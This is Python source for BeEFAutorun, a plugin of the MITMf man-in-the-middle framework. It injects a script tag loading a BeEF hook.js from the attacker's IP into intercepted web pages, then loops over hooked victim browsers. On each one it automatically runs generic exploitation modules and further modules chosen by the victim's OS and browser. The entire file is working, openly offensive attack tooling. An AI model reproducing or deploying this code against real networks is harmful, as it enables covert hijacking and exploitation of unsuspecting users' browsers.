#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import sys
import json

from time import sleep
from core.beefapi import BeefAPI
from core.utils import SystemConfig, shutdown
from plugins.plugin import Plugin
from plugins.Inject import Inject

mitmf_logger = logging.getLogger("mitmf")

class BeefAutorun(Inject, Plugin):
	name     = "BeEFAutorun"
	optname  = "beefauto"
	desc     = "Injects BeEF hooks & autoruns modules based on Browser and/or OS type"
	version  = "0.3"
	has_opts = False

	def initialize(self, options):
		self.options    = options
		self.ip_address = SystemConfig.getIP(options.interface)

		Inject.initialize(self, options)

		self.tree_output.append("Mode: {}".format(self.config['BeEFAutorun']['mode']))
		self.onConfigChange()

	def onConfigChange(self):

		beefconfig = self.config['MITMf']['BeEF']

		self.html_payload = '<script type="text/javascript" src="http://{}:{}/hook.js"></script>'.format(self.ip_address, beefconfig['beefport'])

		self.beef = BeefAPI({"host": beefconfig['beefip'], "port": beefconfig['beefport']})
		if not self.beef.login(beefconfig['user'], beefconfig['pass']):
			shutdown("[-] Error logging in to BeEF!")

	def startThread(self, options):
		self.autorun()

	def autorun(self):
		already_ran    = []
		already_hooked = []

		while True:
			mode = self.config['BeEFAutorun']['mode']
			sessions = self.beef.sessions_online()
			if (sessions is not None and len(sessions) > 0):
				for session in sessions:

					if session not in already_hooked:
						info = self.beef.hook_info(session)
						mitmf_logger.info("{} >> joined the horde! [id:{}, type:{}-{}, os:{}]".format(info['ip'], info['id'], info['name'], info['version'], info['os']))
						already_hooked.append(session)
						self.black_ips.append(str(info['ip']))

					if mode == 'oneshot':
						if session not in already_ran:
							self.execModules(session)
							already_ran.append(session)

					elif mode == 'loop':
						self.execModules(session)
						sleep(10)

			else:
				sleep(1)

	def execModules(self, session):
		session_info     = self.beef.hook_info(session)
		session_ip       = session_info['ip']
		hook_browser     = session_info['name']
		hook_os          = session_info['os']
		all_modules      = self.config['BeEFAutorun']["ALL"]
		targeted_modules = self.config['BeEFAutorun']["targets"]

		if len(all_modules) > 0:
			mitmf_logger.info("{} >> sending generic modules".format(session_ip))
			for module, options in all_modules.iteritems():
				mod_id = self.beef.module_id(module)
				resp = self.beef.module_run(session, mod_id, json.loads(options))
				if resp["success"] == 'true':
					mitmf_logger.info('{} >> sent module {}'.format(session_ip, mod_id))
				else:
					mitmf_logger.info('{} >> ERROR sending module {}'.format(session_ip, mod_id))
				sleep(0.5)

		mitmf_logger.info("{} >> sending targeted modules".format(session_ip))
		for os in targeted_modules:
			if (os in hook_os) or (os == hook_os):
				browsers = targeted_modules[os]
				if len(browsers) > 0:
					for browser in browsers:
						if browser == hook_browser:
							modules = targeted_modules[os][browser]
							if len(modules) > 0:
								for module, options in modules.iteritems():
									mod_id = self.beef.module_id(module)
									resp = self.beef.module_run(session, mod_id, json.loads(options))
									if resp["success"] == 'true':
										mitmf_logger.info('{} >> sent module {}'.format(session_ip, mod_id))
									else:
										mitmf_logger.info('{} >> ERROR sending module {}'.format(session_ip, mod_id))
									sleep(0.5)
